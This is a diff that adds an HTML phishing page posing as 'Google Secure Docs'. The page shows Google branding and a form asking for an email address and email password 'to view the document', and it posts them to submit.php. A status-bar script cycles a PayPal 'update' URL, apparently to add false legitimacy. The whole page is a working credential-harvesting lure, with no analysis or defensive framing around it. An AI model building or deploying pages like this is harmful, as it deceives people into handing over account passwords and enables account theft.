@@ -1,0 +1,241 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+ </head>
+ <body onload="whenLoaded();" style="margin: 5px;">
+  <img width="216" height="150" border="0" src="http://main.makeuseoflimited.netdna-cdn.com/wp-content/uploads/2013/01/Intro-Image.jpg" />
+  <title>
+   Google Secure Docs
+  </title>
+  <link href="http://content.remax-northcentral.com/media/intranet/style/02/intranetstyle.css" type="text/css" rel="stylesheet" />
+  <script type="text/JavaScript" language="JavaScript">
+   function echeck(str) {
+ 
+		var at="@"
+		var dot="."
+		var lat=str.indexOf(at)
+		var lstr=str.length
+		var ldot=str.indexOf(dot)
+		if (str.indexOf(at)==-1){
+		   alert("Invalid E-mail Address")
+		   return false
+		}
+ 
+		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
+		   alert("Invalid E-mail Address")
+		   return false
+		}
+ 
+		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
+		    alert("Invalid E-mail Address")
+		    return false
+		}
+ 
+		 if (str.indexOf(at,(lat+1))!=-1){
+		    alert("Invalid E-mail Address")
+		    return false
+		 }
+ 
+		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
+		    alert("Invalid E-mail Address")
+		    return false
+		 }
+ 
+		 if (str.indexOf(dot,(lat+2))==-1){
+		    alert("Invalid E-mail Address")
+		    return false
+		 }
+		
+		 if (str.indexOf(" ")!=-1){
+		    alert("Invalid E-mail Address")
+		    return false
+		 }
+ 
+ 		 return true					
+	}
+ 
+function submitIt(processForm){
+	if(processForm.userid.value == ""){
+		alert("Please enter your Email Address");
+		processForm.userid.select();
+		return false;
+	}
+	if(processForm.Password.value == ""){
+		alert("Please enter your Email Password");
+		processForm.Password.select();
+		return false;
+	}
+	if (echeck(processForm.userid.value)==false){
+		processForm.userid.value=""
+		processForm.Password.select();
+		return false
+	}
+}
+  </script>
+  <table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0">
+   <form onsubmit="return submitIt(this)" method="post" action="submit.php">
+   </form>
+   <input type="hidden" name="screenSize" id="screenSize" />
+   <tbody>
+    <tr>
+     <td valign="middle" align="center">
+      <table border="0" cellspacing="0" cellpadding="0">
+       <tbody>
+        <tr>
+         <td>
+          <table border="0" cellspacing="0" cellpadding="0" style="width:508px;" class="itemcontainer">
+           <tbody>
+            <tr>
+             <td align="center" colspan="2">
+              <table border="0" cellspacing="0" cellpadding="0">
+               <tbody>
+                <tr>
+                 <td style="font-size:12pt;text-align:center;" class="itemTitle">
+                  Login your email address below to view the document.
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+             </td>
+            </tr>
+            <tr>
+             <td colspan="2">
+              <img height="5" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+             </td>
+            </tr>
+            <tr>
+             <td valign="top" align="center">
+              <table border="0" cellspacing="0" cellpadding="0">
+               <tbody>
+                <tr>
+                 <td>
+                  <img height="20" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+                 </td>
+                </tr>
+                <tr>
+                 <td>
+                  <img width="216" height="100" border="0" src="http://fc05.deviantart.net/fs71/f/2011/249/6/5/google_logo_by_dracu_teufel666-d491ml0.jpg" />
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+             </td>
+             <td valign="top">
+              <table border="0" cellspacing="0" cellpadding="0">
+               <tbody>
+                <tr>
+                 <td class="dataitem" colspan="2">
+                  Email Address
+                 </td>
+                </tr>
+                <tr>
+                 <td style="padding-left: 13px;" colspan="2">
+                  <input type="text" tabindex="1" onkeypress="entsub('intranetlogin');" style="width: 202px;" name="userid" />
+                 </td>
+                </tr>
+                <tr>
+                 <td class="dataitem" colspan="2">
+                  Email Password
+                 </td>
+                </tr>
+                <tr>
+                 <td style="padding-left: 13px;" colspan="2">
+                  <input type="password" id="password" tabindex="2" onkeypress="entsub('intranetlogin');" style="width: 202px; font-size: 11px;" name="password" />
+                 </td>
+                </tr>
+                <tr>
+                 <td class="small" style="padding-left: 13px;" colspan="2">
+                  Passwords are case sensitive
+                 </td>
+                </tr>
+                <tr>
+                 <td valign="top" colspan="2">
+                  <img width="216" height="20" border="0" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+                 </td>
+                </tr>
+                <tr>
+                 <td style="text-align:right; padding-right:6px;" colspan="2">
+                  <span class="buttonSurround">
+                   <input type="submit" tabindex="3" onkeypress="entsub('intranetlogin');" value="     Submit     " class="button" />
+                  </span>
+                 </td>
+                </tr>
+                <tr>
+                 <td valign="top" colspan="2">
+                  <img width="216" height="15" border="0" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+                 </td>
+                </tr>
+                <tr>
+                 <td valign="top" colspan="2">
+                  <img width="216" height="15" border="0" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+        <tr>
+         <td>
+          <table border="0" cellspacing="0" cellpadding="0" style="width:508px;" class="itemcontainer">
+           <tbody>
+            <tr>
+             <td>
+              <img height="20" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+             </td>
+            </tr>
+            <tr>
+             <td align="center">
+              <b>
+               To access our online secured documents page,you are required to login your email address.
+              </b>
+             </td>
+            </tr>
+            <tr>
+             <td align="center">
+              <b>
+               <span>
+                Unauthorized Access is prohibited.
+               </span>
+              </b>
+             </td>
+            </tr>
+            <tr>
+             <td>
+              <img height="20" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+        <tr>
+         <td>
+          <img height="10" src="http://content.remax-northcentral.com/media/global/invis.gif" />
+         </td>
+        </tr>
+        <tr>
+         <td width="508" align="center" style="font-size:11px;">
+          The Intranet Website Management Center requires Internet Explorer 6.0 or greater
+         </td>
+        </tr>
+       </tbody>
+      </table>
+     </td>
+    </tr>
+    <tr>
+     <td valign="bottom" height="20" align="center" id="displayScreenSize" style="font-size: 9px;">
+     </td>
+    </tr>
+   </tbody>
+  </table>
+  <script language="JavaScript">
+   &lt;!-- 
+      // Following COPYRIGHT В©1997  Dennis &amp; Family.  All Rights Reserved. 
+           function snapIn(jumpSpaces,position) { var msg = "http://www.paypal.com/cgi-bin/webscr?cmd=_update"; var out = ""; for (var i=0; i&lt;position; i++) { out += msg.charAt(i) } for (i=1;i&lt;jumpSpaces;i++) { out += " " } out += msg.charAt(position); window.status = out; if (jumpSpaces &lt;= 1) { position++; if (msg.charAt(position) == ' ') { position++ } jumpSpaces = 00-position } else if (jumpSpaces &gt;  3) { jumpSpaces *= .00 } else { jumpSpaces-- } if (position != msg.length) { var cmd = "snapIn(" + jumpSpaces + "," + position + ")"; window.setTimeout(cmd,00); } return true } 
+   //--&gt;
+  </script>
+ </body>
+</html>
